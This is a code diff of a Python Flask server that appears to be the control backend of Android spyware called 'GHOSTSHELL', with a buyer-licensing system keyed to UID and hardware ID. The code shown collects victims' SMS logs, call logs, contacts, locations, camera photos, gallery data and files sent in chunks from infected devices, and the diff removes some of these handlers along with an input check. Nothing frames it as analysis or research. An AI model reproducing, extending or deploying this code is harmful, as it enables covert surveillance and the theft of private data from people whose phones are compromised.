@@ -45,7 +45,6 @@ def init_db():
     conn.commit()
     cur.close()
     conn.close()
-    print("[GHOSTSHELL] > DB Initialized.")
 
 # Folder initialization
 DIRS = ['captured_images', 'device_downloads', 'screen_recordings']
@@ -87,7 +86,6 @@ def handle_tcp_data(raw_line, cid):
             cd = clients[cid]['data']
             
             if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
-            elif t == 'SCREEN_FRAME': cd['screen'] = packet.get('frame')
             elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
             elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
             elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
@@ -97,17 +95,13 @@ def handle_tcp_data(raw_line, cid):
             elif t == 'LOCATION_SUCCESS': 
                 loc = packet.get('data', {}) if isinstance(packet.get('data'), dict) else {"url": packet.get('url')}
                 cd['location'].update({"url": loc.get('url'), "img": loc.get('image_url'), "status": "success"})
-            elif t == 'LOCATION_PENDING': cd['location']['status'] = "waiting"
             elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
             elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
-            elif t == 'WALLPAPER_STATUS': cd['msgs'].insert(0, packet.get('status'))
             elif 'CHUNK' in t:
                 chunk = packet.get('chunk_data', {})
                 fname = chunk.get('filename')
                 if fname: 
                     file_transfers.setdefault(fname, []).append(chunk.get('chunk'))
-                    if len(file_transfers[fname]) % 20 == 0:
-                        add_log(f"Receiving {t}: {fname} (Chunks: {len(file_transfers[fname])})")
             elif 'END' in t:
                 fname = packet.get('file')
                 if fname and fname in file_transfers:
@@ -116,10 +110,8 @@ def handle_tcp_data(raw_line, cid):
                     with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
                     
                     if t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
-                        cd['media'].update({"last_img": fname, "is_direct": False, "status": "done"})
+                        cd['media'].update({"last_img": fname, "status": "done"})
                         add_log(f"IMAGE SAVED: {fname}")
-                    elif fname.endswith('.mp4'):
-                        cd['media'].update({"last_vid": fname, "status": "done"})
                 else:
                     add_log(f"Warning: END received but no data for {fname}")
             
@@ -170,21 +162,17 @@ def admin_login_page():
 @app.route('/admin/dashboard')
 def admin_dashboard():
     if not session.get('is_admin'): return redirect(url_for('admin_login_page'))
-    conn = get_db()
-    cur = conn.cursor()
+    conn = get_db(); cur = conn.cursor()
     cur.execute('SELECT * FROM buyers ORDER BY created_at DESC')
     users = fetch_all_as_dict(cur)
-    cur.close()
-    conn.close()
+    cur.close(); conn.close()
     return render_template('admin.html', view='dashboard', users=users)
 
 @app.route('/api/buyer/login', methods=['POST'])
 def buyer_login():
     data = request.json
     uid, hwid = data.get('uid'), data.get('hwid')
-    if not uid or not hwid: return jsonify({"status": "error", "message": "UID & HWID REQUIRED"}), 400
-    conn = get_db()
-    cur = conn.cursor()
+    conn = get_db(); cur = conn.cursor()
     cur.execute('SELECT * FROM buyers WHERE uid = %s', (uid,))
     user = fetch_one_as_dict(cur)
     if not user:
